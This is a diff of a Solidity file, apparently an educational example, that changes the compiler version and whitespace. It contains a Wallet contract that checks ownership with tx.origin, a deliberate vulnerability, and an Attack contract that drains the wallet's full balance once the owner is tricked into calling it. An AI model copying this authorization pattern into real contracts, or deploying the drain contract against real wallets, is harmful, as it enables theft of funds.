@@ -1,4 +1,4 @@
-pragma solidity ^0.5.16;
+pragma solidity ^0.6.0;
 
 /*
 Wallet is a simple contract where only the owner should be able to transfer
@@ -21,14 +21,14 @@ it authorized the transfer. The wallet transferred all Ether to Eve.
 
 contract Wallet {
     address public owner;
-    
+
     constructor() public payable {
         owner = msg.sender;
     }
-    
+
     function transfer(address payable _to, uint _amount) public {
         require(tx.origin == owner, "Not owner");
-                
+
         (bool sent, ) = _to.call.value(_amount)("");
         require(sent, "Failed to send Ether");
     }
@@ -37,12 +37,12 @@ contract Wallet {
 contract Attack {
     address payable public owner;
     Wallet wallet;
-    
+
     constructor(Wallet _wallet) public {
         wallet = Wallet(_wallet);
         owner = msg.sender;
     }
-    
+
     function attack() public {
         wallet.transfer(owner, address(wallet).balance);
     }
